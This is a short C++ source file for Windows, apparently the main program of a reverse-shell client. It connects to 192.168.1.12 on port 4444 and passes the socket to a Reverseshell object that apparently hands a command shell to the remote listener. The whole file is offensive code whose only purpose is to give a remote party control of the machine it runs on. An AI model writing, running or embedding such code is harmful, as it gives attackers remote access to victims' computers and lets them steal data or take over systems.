#include <iostream>
#include "windows.h"

#include "socket.h" 
#include "ReverseShell.h"
   
int main(int argc, char** argv) {
	 
	
	HANDLE sck;
	SOCKADDR_IN sin; 
	Socket * sock;
	Reverseshell * shell;
	   
	memset( &sin, 0, sizeof(sin) ); 
	
	sin.sin_family 		= AF_INET;
	sin.sin_port   		= htons(4444);
	sin.sin_addr.s_addr = inet_addr("192.168.1.12");
	 
	sock = new Socket( &sin );
  	shell= new Reverseshell( );
  	  
	if( !sock->Connect( ) ){
		
		printf("[+] Connect");
		shell->get( sock );
		sock->Clean( );
	}
	 
	sock->Close( );
	ExitProcess(0);
	 
	return 0;
}
